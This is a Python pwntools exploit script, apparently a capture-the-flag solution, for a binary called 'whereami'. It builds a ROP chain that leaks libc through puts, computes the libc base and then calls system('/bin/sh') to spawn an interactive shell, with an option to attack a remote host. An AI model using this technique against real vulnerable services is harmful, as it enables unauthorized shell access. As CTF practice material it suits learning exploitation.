#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('whereami_patched')
elf = exe
libc = exe.libc

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *main+162
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    offset = 72
    pop_rdi = 0x0000000000401303 # pop rdi; ret; 
    ret = 0x000000000040101a # ret; 
    

    csu_pad_pop = 0x00000000004012f6 # add rsp, 8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15
    dec = 0x00000000004011dc # add dword ptr [rbp - 0x3d], ebx ; nop ; ret

    payload = flat({
        offset: [
            csu_pad_pop,
            0x0,
            0xffffffff,
            elf.sym['counter'] + 0x3d,
            0x0,
            0x0,
            0x0,
            0x0,
            dec,
            pop_rdi,
            elf.got['puts'],
            elf.plt['puts'],
            ret,
            elf.sym['main']
        ]
    })

    io.sendlineafter('?', payload)
    io.recvuntil('too.\n')
    puts = u64(io.recv(6).ljust(8, b'\x00'))
    libc.address = puts - libc.sym['puts']
    info("libc base: %#x", libc.address)

    sh = libc.address + 0x1b45bd
    system = libc.sym['system']

    info("sh: %#x", sh)
    info("system: %#x", system)

    payload = flat({
        offset: [
            pop_rdi,
            sh,
            ret,
            system

        ]
    })

    io.sendline(payload)

    io.interactive()


def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()
